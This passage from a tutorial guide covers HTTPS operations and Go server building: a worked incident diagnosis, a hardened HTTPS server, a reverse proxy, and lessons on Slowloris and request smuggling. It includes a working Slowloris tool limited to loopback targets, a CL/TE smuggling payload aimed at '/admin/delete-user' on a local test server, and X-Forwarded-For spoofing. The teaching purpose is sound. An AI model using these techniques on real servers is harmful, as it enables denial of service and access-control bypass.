| DNS consistency across resolvers | `dnsdiff www.example.com` | [TCP/IP Ch 55](../networking/tcp-ip/real-life-guide-v1.md#chapter-55-dns-operations-authoritative-dns-delegation-split-horizon-outages) |
| Reachability, layer by layer | `netcheck https://www.example.com/app` | [TCP/IP Ch 34](../networking/tcp-ip/real-life-guide-v1.md#chapter-34-a-troubleshooting-method-that-works) |
| Protocol offered (h2/h3, Alt-Svc, HTTPS RR) | `protoprobe www.example.com` | [Chapter 14](#chapter-14-http-version-negotiation-http-1-1-http-2-http-3-alt-svc-and-fallbacks) |
| Phase timing, reuse, cache headers | `httptrace -n 5 https://www.example.com/app` | [Chapter 17](#chapter-17-debugging-the-lifecycle-browser-devtools-curl-openssl-packet-capture-and-logs) |
| Certificates on every edge and subdomain | `certcheck www.example.com new.example.com` | [Chapter 16](#chapter-16-certificate-and-domain-operations-acme-rotation-ct-monitoring-and-emergency-revocation) |
| TLS details and failure diagnosis | `tlsinspect new.example.com` | [TCP/IP Ch 29](../networking/tcp-ip/real-life-guide-v1.md#chapter-29-tls-how-it-gets-encrypted) |
| Security headers present? | `curl -sI` + the header list in [Chapter 19](#chapter-19-a-production-https-server-in-go-tls-timeouts-headers-and-shutdown) | this guide |

### A worked diagnosis

Here's how the scenario resolves when you run the tools in order. (The
findings are illustrative, but each one is a pattern this guide has shown
for real.)

```text
1. dnsdiff www.example.com
   -> all resolvers agree on the CDN's anycast addresses           NOT DNS

2. httptrace -n 5 https://www.example.com/app   (from the affected region)
   -> dns 3ms, tcp 140ms, tls 150ms, ttfb 900ms, X-Cache: MISS every time
   -> high RTT (140 ms) means the user is far from the POP serving them;
      MISS on every request means the edge isn't caching /app at all

3. curl -sI https://www.example.com/app
   -> Cache-Control: no-store                     on the HTML (fine: personalised)
   -> the HTML references /static/app.js?v=2      (NOT content-hashed)
   -> curl -sI .../static/app.js?v=2  ->  Cache-Control: public, max-age=86400

4. Root cause of "old UI": the deploy changed app.js but kept the query string
   "v=2", so browsers and the CDN served yesterday's file for up to 24 h
   (Chapter 15: version by content hash, not by hand).

5. Root cause of "slow": the region's DNS steering sends users to a distant
   POP; and /app's HTML is uncacheable, so every request pays a full origin
   round trip. Mitigation: enable the nearer POP; cache the static shell and
   fetch the personalised data via an API call.

6. certcheck new.example.com; curl -sI https://new.example.com
   -> certificate fine, but no Strict-Transport-Security or CSP:
      the new subdomain bypasses the edge configuration that adds them.
   -> fix: add headers in the application (Chapter 19's middleware), not only at the edge.
```

### Deliverable
Write a short incident note:

```
Impact:
Root cause:
Evidence:
Mitigation:
Permanent fix:
How we will detect this next time:
```

For the worked diagnosis, "how we will detect this next time" might read: a
synthetic `httptrace` probe per region alerting on TTFB p95; a CI check that
fails if a static asset URL isn't content-hashed; and a `curl -sI` check in
the deploy pipeline that fails if any public hostname lacks HSTS or CSP.

If you can do this calmly for an unfamiliar URL, you understand the HTTPS
lifecycle at a genuinely practical level.

### Key Takeaways
- Scope first, then walk the layers in the order the request uses them.
- Every finding needs evidence from a specific tool, with the command recorded.
- The best fixes include detection: a probe, a CI check, or an alert.

---

# Part 9 — Build the lifecycle in Go

Parts 1–8 explained the lifecycle and how to operate it. This part has you
build the **server side** of it: a production-shaped HTTPS server, a reverse
proxy, the resilience mechanisms between services, outbound request safety,
service-level objectives, and streaming. Each chapter centres on one Go
program using only the standard library. Each was run while writing this
guide, and the outputs are real.

These chapters assume you've read the matching concept chapters (named at the
start of each) and know basic Go (the [Go guide](../Golang/real-life-golang-guide.md), Parts I–II).

## Chapter 19 — A production HTTPS server in Go: TLS, timeouts, headers, and shutdown

### In one sentence
A production HTTPS server is mostly configuration: modern TLS, a timeout on every
phase of a connection, security headers on every response, health endpoints,
structured logs, and a shutdown that drains instead of dropping.

### Why this matters
Go makes it easy to write a server that works: `http.ListenAndServeTLS` is one
line. That one-liner has **no timeouts at all**, so a client that sends its
headers slowly holds a connection (and a goroutine, and memory) forever.
It adds no security headers, and it drops in-flight requests when the process
stops. Every one of those defaults has caused real incidents.

### How it actually works

**The four server timeouts**, mapped onto a connection's life:

```
 accept ──[ReadHeaderTimeout]── headers read ──[ReadTimeout: whole body]── handler runs
        ──[WriteTimeout: until response done]── idle keep-alive ──[IdleTimeout]── next request / close
```

| Field | Protects against | Typical value |
|---|---|---|
| `ReadHeaderTimeout` | **Slowloris**: clients trickling headers | 5–10 s |
| `ReadTimeout` | Slow request bodies ("slow POST") | 30 s (more for uploads) |
| `WriteTimeout` | Slow readers holding responses open | 30 s (**but see Chapter 24 for streams**) |
| `IdleTimeout` | Idle keep-alive connections piling up | 60–120 s (*longer* than your LB's idle timeout) |
| `MaxHeaderBytes` | Huge header floods | 32 KB–1 MB |

**TLS configuration in Go is mostly "don't touch it".** Go's defaults prefer TLS
1.3, choose strong cipher suites, and get updated with each release. Set
`MinVersion: tls.VersionTLS12` (TLS 1.0 and 1.1 are formally deprecated by
RFC 8996) and leave the rest alone unless a compliance standard requires
otherwise.

**Security headers** (Chapter 12) are best set in one middleware, so no handler
can forget them. HSTS is only meaningful over HTTPS, which is why the
middleware sets it only when `r.TLS != nil`.

### Build it in Go (45 min) — the server

```go
// httpsserver: a production-shaped HTTPS server using only the standard
// library -- modern TLS, every timeout set, security headers, HTTP->HTTPS
// redirect, health endpoints, structured logs, and graceful shutdown.
//
//	go run ./httpsserver                         # self-signed cert, :8443 + :8080 redirect
//	go run ./httpsserver -cert c.pem -key k.pem  # your own certificate
//	go run ./httpsserver -plain :8080 -no-timeouts   # plain HTTP, NO timeouts (the Slowloris lab)
package main

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"errors"
	"flag"
	"fmt"
	"log/slog"
	"math/big"
	"net"
	"net/http"
	"os"
	"os/signal"
	"sync/atomic"
	"syscall"
	"time"
)

func main() {
	addr := flag.String("addr", ":8443", "HTTPS listen address")
	redirect := flag.String("redirect", ":8080", "plain-HTTP listener that only redirects to HTTPS ('' to disable)")
	plain := flag.String("plain", "", "serve the app over PLAIN HTTP on this address instead (lab use)")
	certFile := flag.String("cert", "", "certificate PEM (default: generate self-signed)")
	keyFile := flag.String("key", "", "private key PEM")
	noTimeouts := flag.Bool("no-timeouts", false, "DANGEROUS: zero timeouts, to demonstrate Slowloris")
	flag.Parse()

	log := slog.New(slog.NewJSONHandler(os.Stdout, nil))
	var ready atomic.Bool
	var open atomic.Int64

	mux := http.NewServeMux()
	mux.HandleFunc("GET /healthz", func(w http.ResponseWriter, _ *http.Request) { w.Write([]byte("ok")) }) // liveness
	mux.HandleFunc("GET /readyz", func(w http.ResponseWriter, _ *http.Request) {                           // readiness
		if !ready.Load() {
			http.Error(w, "not ready", http.StatusServiceUnavailable)
			return
		}
		w.Write([]byte("ready"))
	})
	mux.HandleFunc("GET /{$}", func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, "hello over %s (%s)\n", r.Proto, tlsVersion(r))
	})

	srv := &http.Server{
		Addr:    *addr,
		Handler: securityHeaders(logRequests(log, mux)),
		// The four timeouts. Go's zero values mean "wait forever", which is
		// exactly what Slowloris exploits.
		ReadHeaderTimeout: 5 * time.Second,   // client must finish sending headers
		ReadTimeout:       30 * time.Second,  // ...and the whole request body
		WriteTimeout:      30 * time.Second,  // we must finish the response
		IdleTimeout:       120 * time.Second, // keep-alive connections between requests
		MaxHeaderBytes:    32 << 10,          // 32 KB of headers is plenty
		TLSConfig: &tls.Config{
			MinVersion: tls.VersionTLS12, // TLS 1.0/1.1 are deprecated (RFC 8996)
			// Go's defaults pick strong cipher suites and prefer TLS 1.3;
			// resist the urge to hand-tune them.
		},
		ConnState: func(_ net.Conn, s http.ConnState) { // count open connections
			switch s {
			case http.StateNew:
				open.Add(1)
			case http.StateClosed, http.StateHijacked:
				open.Add(-1)
			}
		},
		ErrorLog: slog.NewLogLogger(log.Handler(), slog.LevelWarn),
	}
	if *noTimeouts {
		srv.ReadHeaderTimeout, srv.ReadTimeout, srv.WriteTimeout, srv.IdleTimeout = 0, 0, 0, 0
		log.Warn("timeouts disabled: this server can be held open forever")
	}
	go func() { // report open connections every 5s, so the Slowloris lab is visible
		for range time.Tick(5 * time.Second) {
			log.Info("connections", "open", open.Load())
		}
	}()

	if *plain != "" {
		srv.Addr = *plain
		go func() { log.Error("serve", "err", srv.ListenAndServe()) }()
	} else {
		cert, err := loadOrGenerate(*certFile, *keyFile)
		if err != nil {
			log.Error("certificate", "err", err)
			os.Exit(1)
		}
		srv.TLSConfig.Certificates = []tls.Certificate{cert}
		go func() {
			if err := srv.ListenAndServeTLS("", ""); !errors.Is(err, http.ErrServerClosed) {
				log.Error("serve", "err", err)
				os.Exit(1)
			}
		}()
		if *redirect != "" {
			go http.ListenAndServe(*redirect, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				host, _, _ := net.SplitHostPort(r.Host)
				if host == "" {
					host = r.Host
				}
				_, port, _ := net.SplitHostPort(*addr)
				http.Redirect(w, r, "https://"+net.JoinHostPort(host, port)+r.URL.RequestURI(), http.StatusMovedPermanently)
			}))
		}
	}
	ready.Store(true)
	log.Info("listening", "https", *addr, "plain", *plain, "redirect", *redirect)

	// Graceful shutdown: fail readiness, wait, drain, exit (TCP/IP guide Ch 57).
	ctx, stop := signal.NotifyContext(context.Background(), syscall.SIGTERM, os.Interrupt)
	defer stop()
	<-ctx.Done()
	ready.Store(false)
	log.Info("draining")
	time.Sleep(2 * time.Second)
	sctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()
	srv.Shutdown(sctx)
	log.Info("stopped")
}

// securityHeaders sets the browser-side protections from Chapter 12 on every response.
func securityHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		h := w.Header()
		if r.TLS != nil { // HSTS is only meaningful (and only honoured) over HTTPS
			h.Set("Strict-Transport-Security", "max-age=63072000; includeSubDomains")
		}
		h.Set("Content-Security-Policy", "default-src 'self'; frame-ancestors 'none'; base-uri 'none'")
		h.Set("X-Content-Type-Options", "nosniff")
		h.Set("Referrer-Policy", "strict-origin-when-cross-origin")
		h.Set("Permissions-Policy", "camera=(), microphone=(), geolocation=()")
		next.ServeHTTP(w, r)
	})
}

type statusRecorder struct {
	http.ResponseWriter
	status int
}

func (s *statusRecorder) WriteHeader(code int) { s.status = code; s.ResponseWriter.WriteHeader(code) }

func logRequests(log *slog.Logger, next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		start := time.Now()
		rec := &statusRecorder{w, http.StatusOK}
		next.ServeHTTP(rec, r)
		log.Info("request", "method", r.Method, "path", r.URL.Path, "proto", r.Proto,
			"status", rec.status, "ms", time.Since(start).Milliseconds(), "remote", r.RemoteAddr)
	})
}

func tlsVersion(r *http.Request) string {
	if r.TLS == nil {
		return "no TLS"
	}
	return tls.VersionName(r.TLS.Version) + ", ALPN " + r.TLS.NegotiatedProtocol
}

func loadOrGenerate(certFile, keyFile string) (tls.Certificate, error) {
	if certFile != "" {
		return tls.LoadX509KeyPair(certFile, keyFile)
	}
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return tls.Certificate{}, err
	}
	serial, _ := rand.Int(rand.Reader, big.NewInt(1<<62))
	tmpl := &x509.Certificate{
		SerialNumber: serial,
		Subject:      pkix.Name{CommonName: "localhost"},
		DNSNames:     []string{"localhost"},
		IPAddresses:  []net.IP{net.ParseIP("127.0.0.1")},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(30 * 24 * time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		return tls.Certificate{}, err
	}
	return tls.Certificate{Certificate: [][]byte{der}, PrivateKey: key}, nil
}
```

Check it:

```text
$ go run ./httpsserver -addr 127.0.0.1:9443 -redirect 127.0.0.1:9480 &
$ curl -sk -D - https://127.0.0.1:9443/
HTTP/2 200
content-security-policy: default-src 'self'; frame-ancestors 'none'; base-uri 'none'
permissions-policy: camera=(), microphone=(), geolocation=()
referrer-policy: strict-origin-when-cross-origin
strict-transport-security: max-age=63072000; includeSubDomains
x-content-type-options: nosniff
...
hello over HTTP/2.0 (TLS 1.3, ALPN h2)

$ curl -s -o /dev/null -w '%{http_code} -> %{redirect_url}\n' 'http://127.0.0.1:9480/x?y=1'
301 -> https://127.0.0.1:9443/x?y=1

$ kill -TERM %1
{"level":"INFO","msg":"draining"}
{"level":"INFO","msg":"stopped"}
```

**What to notice:**

- **HTTP/2 came for free.** `ListenAndServeTLS` negotiates `h2` via ALPN
  automatically. No code was needed.
- **The `GET /{$}` pattern** (Go 1.22+ routing) matches exactly `/`, so
  unknown paths get a 404 instead of falling through to the home page.
- **Liveness vs readiness**: `/healthz` always says "the process is alive";
  `/readyz` fails during draining so the load balancer stops sending traffic
  ([TCP/IP guide, Chapter 57](../networking/tcp-ip/real-life-guide-v1.md#chapter-57-production-load-balancing-l4-vs-l7-health-checks-draining-retries)).
- **`ConnState`** counts open connections, which is the number Slowloris
  inflates.
- **Certificates**: the lab generates a self-signed one. In production use an
  ACME client, or `golang.org/x/crypto/acme/autocert`, which plugs into
  `TLSConfig.GetCertificate` and renews automatically (Chapter 16).

### Build it in Go (20 min) — Slowloris, safely

`slowloris` opens many connections and sends request headers one line every 3
seconds, never finishing. It **refuses any target that isn't a loopback
address**: it's for demonstrating your own server's defences, nothing else.

```go
// slowloris: a LOCAL-ONLY demonstration of why HTTP servers need timeouts.
// It opens many connections and sends request headers one slow line at a
// time, never finishing, so a server without a header timeout keeps every
// connection (and its goroutine/thread/memory) open indefinitely.
//
// It refuses to target anything but a loopback address. Use it only against
// servers you run yourself (Chapter 19's httpsserver).
//
//	go run ./slowloris -target 127.0.0.1:8080 -conns 200 -for 30s
package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"sync"
	"sync/atomic"
	"time"
)

func main() {
	target := flag.String("target", "127.0.0.1:8080", "loopback host:port of YOUR test server")
	conns := flag.Int("conns", 200, "connections to open")
	dur := flag.Duration("for", 30*time.Second, "how long to keep trying")
	every := flag.Duration("every", 3*time.Second, "delay between header lines")
	flag.Parse()

	host, _, err := net.SplitHostPort(*target)
	if ip := net.ParseIP(host); err != nil || ip == nil || !ip.IsLoopback() {
		fmt.Println("refusing: -target must be a loopback IP (127.0.0.1 or ::1) of a server you run")
		os.Exit(2)
	}

	var alive atomic.Int64
	var wg sync.WaitGroup
	deadline := time.Now().Add(*dur)
	for i := 0; i < *conns; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			c, err := net.DialTimeout("tcp", *target, 3*time.Second)
			if err != nil {
				return
			}
			defer c.Close()
			alive.Add(1)
			defer alive.Add(-1)
			fmt.Fprintf(c, "GET / HTTP/1.1\r\nHost: %s\r\n", host) // no blank line: never finished
			for n := 0; time.Now().Before(deadline); n++ {
				time.Sleep(*every)
				if _, err := fmt.Fprintf(c, "X-Slow-%d: keep-waiting\r\n", n); err != nil {
					return // the server hung up on us: its timeout worked
				}
			}
		}()
	}
	for t := time.Now(); time.Now().Before(deadline); time.Sleep(5 * time.Second) {
		fmt.Printf("t=%2.0fs  connections still held open by the server: %d/%d\n",
			time.Since(t).Seconds(), alive.Load(), *conns)
	}
	wg.Wait()
}
```

Run it against the server with timeouts disabled, then with them enabled:

```text
$ go run ./httpsserver -plain 127.0.0.1:9481 -no-timeouts &
$ go run ./slowloris -target 127.0.0.1:9481 -conns 200 -for 16s
t= 5s  connections still held open by the server: 200/200
t=10s  connections still held open by the server: 200/200
t=15s  connections still held open by the server: 200/200

$ go run ./httpsserver -plain 127.0.0.1:9482 &        # ReadHeaderTimeout = 5s
$ go run ./slowloris -target 127.0.0.1:9482 -conns 200 -for 16s
t= 5s  connections still held open by the server: 200/200
t=10s  connections still held open by the server: 0/200
t=15s  connections still held open by the server: 0/200
```

With no header timeout, 200 connections from one process are held forever,
and 200,000 from a botnet would exhaust memory or file descriptors. With
`ReadHeaderTimeout: 5s`, every one is closed within the next few seconds.
Note that the trickle never stopped: each connection was *still sending*.
A timeout per write wouldn't catch it. The deadline has to cover the *whole*
header phase.

### Real-world scenario
A team runs a Go API directly on the internet with `http.ListenAndServe`.
During a minor DDoS, connections climb into the hundreds of thousands while
request rate stays flat, and the process is OOM-killed. Nothing in the
access logs explains it, because no request ever completed. The fix is four
fields on `http.Server`, plus a reverse proxy or CDN in front that absorbs
slow clients before they reach the app.

### Common mistakes
- Using `http.ListenAndServe` (no timeouts) in production code.
- Setting `WriteTimeout` and then wondering why streaming endpoints and large
  downloads get cut off (Chapter 24).
- Adding security headers in some handlers but not others. Use middleware.
- Exiting immediately on SIGTERM instead of draining.
- Hand-tuning cipher suites from an old blog post, which locks in weaker
  choices than Go's maintained defaults.

### Check yourself
1. Which `http.Server` field stops Slowloris, and why doesn't `WriteTimeout`?
2. Why is HSTS only set when `r.TLS != nil`?
3. What's the difference between `/healthz` and `/readyz` during a shutdown?
4. Why should `IdleTimeout` be longer than the load balancer's idle timeout?

### Key Takeaways
- Set all four timeouts and `MaxHeaderBytes` on every `http.Server`.
- Put security headers in middleware. Leave TLS cipher choices to Go's defaults.
- Fail readiness, wait, drain, then exit.

**Across the series:** [Go guide, Chapter 62](../Golang/real-life-golang-guide.md#62-production-http-apis-validation-timeouts-middleware-shutdown) (production HTTP
APIs) and [Chapter 57](../Golang/real-life-golang-guide.md#57-shipping-it-cross-compilation-docker-systemd-graceful-shutdown) (shipping: Docker, systemd, graceful
shutdown); Go plan [Day 62](../Golang/detailed-90-day-plan/week9.md#day-62-net-http-server-configuration) (hardened server) and
[Day 107](../Golang/detailed-90-day-plan/week15.md#day-107-multi-stage-graceful-shutdown) (multi-stage graceful shutdown);
[Linux guide, Chapter 20](../os-linux/real-life-os-guide.md#chapter-20-signals-the-os-s-tap-on-the-shoulder) for how SIGTERM reaches your
process.

## Chapter 20 — Reverse proxies in Go: the client's identity, framing, and request smuggling

### In one sentence
A reverse proxy is a full HTTP client *and* server in one process. Most proxy
bugs come from losing the client's identity, trusting headers the client
wrote, or disagreeing with another hop about where a request ends.

### Why this matters
Every request in production passes through at least one proxy (CDN, load
balancer, ingress, sidecar). Proxies decide what your application believes
about the client (its IP address, its scheme, its host) and what your logs
and rate limiters record. A proxy that parses HTTP differently from the
server behind it can be tricked into letting through a request it never
inspected.

### How it actually works

**The client's identity.** Behind a proxy, `r.RemoteAddr` is the proxy. The
proxy passes the real client along in headers:

```
X-Forwarded-For: 203.0.113.7, 10.0.1.15     (client, then each proxy that appended)
X-Forwarded-Proto: https
X-Forwarded-Host: shop.example.com
Forwarded: for=203.0.113.7;proto=https;host=shop.example.com   (the RFC 7239 standard form)
```

The client can send any of these headers itself. A proxy must therefore
either **replace** them or **append** to them, and the application must trust
only the entries added by proxies it controls: the right-most ones, counted
from the edge.

**Hop-by-hop headers** (`Connection`, `Keep-Alive`, `Transfer-Encoding`, `TE`,
`Upgrade`, and anything named in `Connection`) describe one connection and
must not be forwarded. Go's `ReverseProxy` strips them.

**Request smuggling.** HTTP/1.1 has two ways to say where a body ends:
`Content-Length` and `Transfer-Encoding: chunked`. If a request carries both
and the front end and back end each believe a different one, they disagree
about where the request ends. The leftover bytes become the start of a
*second* request that the front end never saw. Defences: front ends that
reject ambiguous requests, proxies that fully parse and **re-serialise**
requests (as Go's `ReverseProxy` does) rather than passing bytes through, and
HTTP/2 between hops (its binary framing has no ambiguity).

### Build it in Go (40 min) — a reverse proxy that gets the details right

```go
// revproxy: a path-routing reverse proxy, built to show the details that
// matter in production -- who the client is (X-Forwarded-*), hop-by-hop
// headers, upstream timeouts, and 502 vs 504.
//
//	go run ./revproxy -demo
package main

import (
	"context"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/http/httptest"
	"net/http/httputil"
	"net/url"
	"strings"
	"time"
)

type route struct {
	prefix string
	target *url.URL
}

// newProxy routes by path prefix, first match wins, so list longer prefixes
// first. Rewrite (Go 1.20+) is the safe API: the outgoing request starts
// WITHOUT the client's X-Forwarded-* headers, and SetXForwarded adds fresh
// ones from the real TCP peer.
func newProxy(routes []route) http.Handler {
	transport := &http.Transport{
		DialContext:           (&net.Dialer{Timeout: 2 * time.Second}).DialContext,
		ResponseHeaderTimeout: 2 * time.Second, // upstream must START answering in 2s
		IdleConnTimeout:       60 * time.Second,
		MaxIdleConnsPerHost:   64, // the default of 2 causes connection churn under load
	}
	return &httputil.ReverseProxy{
		Rewrite: func(pr *httputil.ProxyRequest) {
			for _, rt := range routes {
				if strings.HasPrefix(pr.In.URL.Path, rt.prefix) {
					pr.SetURL(rt.target)
					break
				}
			}
			pr.SetXForwarded() // X-Forwarded-For/Host/Proto from the TCP connection
		},
		Transport: transport,
		ErrorHandler: func(w http.ResponseWriter, r *http.Request, err error) {
			status := http.StatusBadGateway // 502: couldn't get a valid response
			if errors.Is(err, context.DeadlineExceeded) || isTimeout(err) {
				status = http.StatusGatewayTimeout // 504: upstream too slow
			}
			log.Printf("proxy %s %s -> %d: %v", r.Method, r.URL.Path, status, err)
			http.Error(w, http.StatusText(status), status)
		},
	}
}

func isTimeout(err error) bool {
	var ne net.Error
	return errors.As(err, &ne) && ne.Timeout()
}

// legacyProxy is the pre-Go-1.20 Director style, shown for contrast: it
// APPENDS to whatever X-Forwarded-For the client sent.
func legacyProxy(target *url.URL) http.Handler {
	return httputil.NewSingleHostReverseProxy(target)
}

func main() {
	demo := flag.Bool("demo", false, "run a scripted demo")
	flag.Parse()
	if !*demo {
		fmt.Println("run with -demo")
		return
	}
	log.SetFlags(0)

	echo := func(name string) *httptest.Server {
		return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/api/slow" {
				time.Sleep(3 * time.Second)
			}
			fmt.Fprintf(w, "%s saw path=%s XFF=%q Proto=%q Connection=%q",
				name, r.URL.Path, r.Header.Get("X-Forwarded-For"), r.Header.Get("X-Forwarded-Proto"), r.Header.Get("Connection"))
		}))
	}
	api, web := echo("api"), echo("web")
	defer api.Close()
	defer web.Close()
	apiURL, _ := url.Parse(api.URL)
	webURL, _ := url.Parse(web.URL)
	dead, _ := url.Parse("http://127.0.0.1:1") // nothing listens on port 1

	proxy := httptest.NewServer(newProxy([]route{{"/api/", apiURL}, {"/down/", dead}, {"/", webURL}}))
	defer proxy.Close()
	legacy := httptest.NewServer(legacyProxy(webURL))
	defer legacy.Close()

	get := func(label, base, path string, hdr map[string]string) {
		req, _ := http.NewRequest("GET", base+path, nil)
		for k, v := range hdr {
			req.Header.Set(k, v)
		}
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			fmt.Println(label, err)
			return
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		fmt.Printf("%-22s %d  %s\n", label, resp.StatusCode, strings.TrimSpace(string(b)))
	}
	spoof := map[string]string{"X-Forwarded-For": "6.6.6.6", "Connection": "X-Secret", "X-Secret": "hop"}

	get("route /api/users", proxy.URL, "/api/users", nil)
	get("route /index.html", proxy.URL, "/index.html", nil)
	get("spoofed XFF (Rewrite)", proxy.URL, "/", spoof)
	get("spoofed XFF (Director)", legacy.URL, "/", spoof)
	get("dead upstream", proxy.URL, "/down/x", nil)
	get("slow upstream", proxy.URL, "/api/slow", nil)
}
```

```text
$ go run ./revproxy -demo
route /api/users       200  api saw path=/api/users XFF="127.0.0.1" Proto="http" Connection=""
route /index.html      200  web saw path=/index.html XFF="127.0.0.1" Proto="http" Connection=""
spoofed XFF (Rewrite)  200  web saw path=/ XFF="127.0.0.1" Proto="http" Connection=""
spoofed XFF (Director) 200  web saw path=/ XFF="6.6.6.6, 127.0.0.1" Proto="" Connection=""
proxy GET /down/x -> 502: dial tcp 127.0.0.1:1: connect: connection refused
dead upstream          502  Bad Gateway
proxy GET /api/slow -> 504: net/http: timeout awaiting response headers
slow upstream          504  Gateway Timeout
```

**What to notice:**

- **`Rewrite` vs `Director`**: the client sent `X-Forwarded-For: 6.6.6.6`. With
  Go 1.20's `Rewrite` API, the backend saw only the real peer address. With
  the older `Director` API (`NewSingleHostReverseProxy`), the client's fake
  value reached the backend first in the list, and an application that reads
  the first entry would rate-limit, geo-locate, or audit-log `6.6.6.6`.
- **`Connection: X-Secret`** was stripped by both: hop-by-hop handling is built in.
- **502 vs 504 is a diagnosis.** 502: the proxy couldn't get a valid response
  (here, connection refused). 504: the upstream accepted the connection but
  didn't answer within `ResponseHeaderTimeout`.
- **`MaxIdleConnsPerHost: 64`**: Go's default is 2, so a busy proxy would open
  and close upstream connections constantly, wasting handshakes and filling
  TIME_WAIT ([TCP/IP guide, Chapter 23](../networking/tcp-ip/real-life-guide-v1.md#chapter-23-tcp-part-3-closing-a-connection-and-the-states)).
- **Route order matters.** An earlier draft of this lab stored routes in a Go
  map, and map iteration order is random, so `/api/users` sometimes went to
  the catch-all `/` backend. Routing tables must be ordered (longest prefix
  first) or use a router that guarantees it.

### Build it in Go (15 min) — request smuggling's root cause

`desync` sends one message carrying both framing headers to a Go server it
starts itself, and shows how the server splits it:

```go
// desync: see HTTP request smuggling's root cause -- two parsers disagreeing
// about where a request ends. Self-contained: it only talks to a test server
// it starts itself.
//
//	go run ./desync
package main

import (
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"time"
)

func main() {
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, "backend handled: %s %s\n", r.Method, r.URL.Path)
	}))
	defer backend.Close()

	// ONE message with BOTH framing headers. A front end that trusts
	// Content-Length (10 bytes: "0\r\n\r\nGET /") sees one POST whose body
	// ends mid-line. The backend follows RFC 9112 -- Transfer-Encoding wins --
	// so the body ends at the "0" chunk and everything after it is parsed as a
	// SECOND request the front end never inspected.
	msg := "POST /search HTTP/1.1\r\nHost: shop\r\n" +
		"Content-Length: 10\r\nTransfer-Encoding: chunked\r\n\r\n" +
		"0\r\n\r\n" +
		"GET /admin/delete-user HTTP/1.1\r\nHost: shop\r\n\r\n"

	c, err := net.Dial("tcp", strings.TrimPrefix(backend.URL, "http://"))
	if err != nil {
		panic(err)
	}
	defer c.Close()
	c.SetDeadline(time.Now().Add(2 * time.Second))
	io.WriteString(c, msg)
	out, _ := io.ReadAll(c)
	for _, line := range strings.Split(string(out), "\n") {
		if strings.HasPrefix(line, "HTTP/") || strings.HasPrefix(line, "backend") {
			fmt.Println(strings.TrimSpace(line))
		}
	}
	fmt.Println("\nOne message in, TWO requests handled. If a front end had checked only")
	fmt.Println("POST /search, then GET /admin/delete-user was smuggled past it.")
}
```

```text
$ go run ./desync
HTTP/1.1 200 OK
backend handled: POST /search
HTTP/1.1 200 OK
backend handled: GET /admin/delete-user

One message in, TWO requests handled. If a front end had checked only
POST /search, then GET /admin/delete-user was smuggled past it.
```

**What's happening:** Go follows RFC 9112, where `Transfer-Encoding` overrides
`Content-Length`. The chunked body ends at `0\r\n\r\n`, and the rest of the
bytes are parsed as a new request on the same connection. A front end that
had framed the message by `Content-Length` would have forwarded all of it as
*one* request after checking only `POST /search`.

Two more facts from testing this with Go 1.26:

- Go's handler never sees the conflict: the `Content-Length` header is removed
  before your code runs. **You can't detect smuggling inside a Go handler.**
  It has to be stopped by the parser in front.
- RFC 9112 says a server *must close the connection* after responding to a
  request with both headers. In this test the Go server answered the second
  request on the same connection. Don't rely on any single component's
  parser. Reject ambiguous requests at the edge, and prefer HTTP/2 between
  proxies and backends.

### Real-world scenario
An application rate-limits login attempts by `X-Forwarded-For`, taking the
first entry. Attackers send `X-Forwarded-For: <random IP>` on every request,
each attempt appears to come from a new IP, and the rate limiter never
triggers. The fix is to read the address the *trusted* edge proxy appended
(or to configure the edge to overwrite the header) and to rate-limit by
account as well as by IP (Chapter 21).

### Common mistakes
- Trusting the left-most `X-Forwarded-For` entry.
- Using `NewSingleHostReverseProxy` without understanding that it appends to
  client-supplied forwarding headers.
- Leaving `MaxIdleConnsPerHost` at its default of 2 on a busy proxy.
- No `ResponseHeaderTimeout`: one hung backend ties up proxy connections indefinitely.
- Passing raw bytes between hops whose HTTP parsers differ.

### Check yourself
1. Which `X-Forwarded-For` entry should an application trust, and why?
2. What does `pr.SetXForwarded()` do differently from the `Director` behaviour?
3. Why can't a Go handler detect a smuggling attempt?
4. What does a 504 from your proxy tell you that a 502 doesn't?

### Key Takeaways
- Use `httputil.ReverseProxy` with `Rewrite` and `SetXForwarded`, and set transport timeouts.
- Trust only forwarding headers added by your own proxies.
- Smuggling is a parser disagreement. Normalise framing at the edge and use HTTP/2 between hops.

**Across the series:** [Chapter 8](#chapter-8-proxies-the-middlemen) (proxy types);
[TCP/IP guide, Chapter 57](../networking/tcp-ip/real-life-guide-v1.md#chapter-57-production-load-balancing-l4-vs-l7-health-checks-draining-retries) (PROXY protocol for L4
proxies); Go plan [Day 64](../Golang/detailed-90-day-plan/week9.md#day-64-http-reverse-proxy) (production reverse proxy) and
[Day 63](../Golang/detailed-90-day-plan/week9.md#day-63-http-middleware) (security middleware chain).

## Chapter 21 — Resilience between services: rate limits, retries, idempotency, and circuit breakers

### In one sentence
Retries turn brief failures into successes, but only when operations are
idempotent, retries are budgeted and jittered, overloaded servers can say
"slow down", and clients stop calling a dependency that is clearly down.

### Why this matters
In a system of services, every call can fail transiently. Without retries,
users see those failures. With naive retries, a slow dependency receives 3×,
9×, or 27× its normal traffic exactly when it's least able to cope, and a
